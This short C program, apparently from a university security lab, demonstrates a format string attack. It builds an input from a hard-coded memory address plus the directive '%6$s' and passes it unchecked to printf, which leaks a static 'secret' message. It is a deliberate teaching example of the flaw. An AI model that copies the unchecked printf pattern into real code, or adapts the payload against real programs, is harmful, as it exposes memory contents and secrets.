/*CR@IITM 24/7/2017 */
#include <stdio.h>
#include <string.h>

/* optimizing print2.c 
 * uses %N$s, where $N is the N'th offset in the stack
*/

static char s[1024] = "THIS IS A TOP SECRET MESSAGE!!!";
void main()
{
	char user_string[100];
	printf("%08x\n", s);
	
	memset(user_string, 0, sizeof(user_string));
	/* user_string can be filled by other means as well such 
           as by a network packet or a scanf */
	strcpy(user_string , "\x40\xa0\x04\x08%6$s"); /* First 4 digits should match the address of s */
	printf(user_string);
}
